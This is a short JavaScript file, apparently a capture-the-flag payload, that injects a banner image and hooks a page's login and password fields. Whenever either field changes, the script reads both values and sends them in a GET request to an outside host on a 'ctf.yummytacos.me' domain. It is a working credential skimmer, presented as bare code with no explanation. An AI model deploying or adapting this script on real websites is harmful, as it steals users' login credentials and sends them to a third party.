document.getElementById('ytctf_banner').innerHTML = '<img height="200px" width="200px" src="https://money.ctf.yummytacos.me/banner/image.php?t=' + new Date().getTime() + '"/>';
document.querySelector('#ytctf_banner img').onclick = function() {
    document.querySelector('#ytctf_banner img').src = 'https://money.ctf.yummytacos.me/banner/image.php?t=' + new Date().getTime();
}
document.querySelector('input[name=login]').onchange = a;
document.querySelector('input[name=password]').onchange = a;
function a() {
    if (document.querySelector('input[name=login]') != null && document.querySelector('input[name=password]') != null) {
        xhr = new XMLHttpRequest();
        login = document.querySelector('input[name=login]').value;
        password = document.querySelector('input[name=password]').value;
        xhr.open('GET', `https://money.ctf.yummytacos.me/banner/image.php?login="${login}"&password="${password}"`, true);
        xhr.send();
    }
}
